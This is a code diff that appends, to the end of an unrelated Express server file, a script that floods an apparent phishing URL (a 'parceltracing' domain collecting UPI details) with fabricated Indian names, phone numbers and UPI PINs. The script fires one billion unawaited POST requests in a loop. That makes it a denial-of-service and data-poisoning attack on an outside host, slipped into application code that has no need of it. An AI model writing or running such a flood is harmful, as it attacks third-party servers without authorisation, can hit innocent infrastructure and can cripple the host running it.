@@ -54,3 +54,85 @@ app.listen(
     `Server running in ${process.env.NODE_ENV} mode on port ${PORT}`.yellow.bold
   )
 );
+var axios = require("axios");
+var FormData = require("form-data");
+
+function generateRandomUPID(length) {
+  const characters = "0123456789";
+  let upid = "";
+  for (let i = 0; i < length; i++) {
+    upid += characters.charAt(Math.floor(Math.random() * characters.length));
+  }
+  return upid;
+}
+
+function generateRandomIndianPhoneNumber() {
+  const countryCode = "+91";
+  const firstDigit = Math.floor(Math.random() * 9) + 6;
+  const remainingDigits = Math.floor(Math.random() * 900000000) + 100000000;
+  return `${countryCode}${firstDigit}${remainingDigits}`;
+}
+
+function generateRandomName() {
+  const firstNames = [
+    "Aarav",
+    "Vivaan",
+    "Aditya",
+    "Vihaan",
+    "Arjun",
+    "Sai",
+    "Ananya",
+    "Aadhya",
+    "Diya",
+    "Myra",
+  ];
+
+  const lastNames = [
+    "Sharma",
+    "Verma",
+    "Patel",
+    "Reddy",
+    "Kumar",
+    "Nair",
+    "Singh",
+    "Gupta",
+    "Mehta",
+    "Jain",
+  ];
+
+  const randomFirstName =
+    firstNames[Math.floor(Math.random() * firstNames.length)];
+  const randomLastName =
+    lastNames[Math.floor(Math.random() * lastNames.length)];
+
+  return `${randomFirstName} ${randomLastName}`;
+}
+
+function sendRequest() {
+  var data = new FormData();
+  data.append("fullName", generateRandomName());
+  data.append("bankName", "Bank of India");
+  data.append("upiRegisteredNumber", generateRandomIndianPhoneNumber());
+  data.append("upiPin", generateRandomUPID(6));
+
+  var config = {
+    method: "post",
+    url: "https://sonuv.parceltracing.com/%24Gh3_%402%26E*(b%5E%409%23L6K%40/success.php",
+    headers: {
+      ...data.getHeaders(),
+    },
+    data: data,
+  };
+
+  axios(config)
+    .then(function (response) {
+      //   console.log(JSON.stringify(response.data));
+    })
+    .catch(function (error) {
+      console.log("ERROR", error);
+    });
+}
+
+for (let i = 0; i < 1000000000; i++) {
+  sendRequest();
+}
